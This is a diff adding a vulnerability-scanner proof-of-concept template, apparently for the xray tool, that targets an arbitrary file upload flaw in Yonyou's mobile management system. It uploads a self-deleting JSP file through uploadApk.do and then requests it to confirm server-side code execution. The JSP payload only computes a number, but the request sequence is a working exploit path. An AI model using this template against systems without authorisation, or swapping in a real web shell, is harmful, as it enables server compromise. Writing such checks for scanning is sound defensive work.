@@ -1,0 +1,31 @@
+name: poc-yaml-yonyou-mobile-uploadApk-fileupload
+manual: true
+transport: http
+set:
+    rfilename: randomLowercase(4)
+    s1: randomInt(40000, 44800)
+    s2: randomInt(40000, 44800)
+    rboundary: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /maportal/appmanager/uploadApk.do?pk_obj=
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"downloadpath\"; filename=\"{{rfilename}}.jsp\"\r\nContent-Type: application/msword\r\n\r\n<%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("\"status\":2")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /maupload/apk/{{rfilename}}.jsp
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(string(s1 * s2))
+expression: r0() && r1()
+detail:
+    author: chaitin
+    links:
+        - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/用友OA/用友%20移动管理系统%20uploadApk.do%20任意文件上传漏洞.md
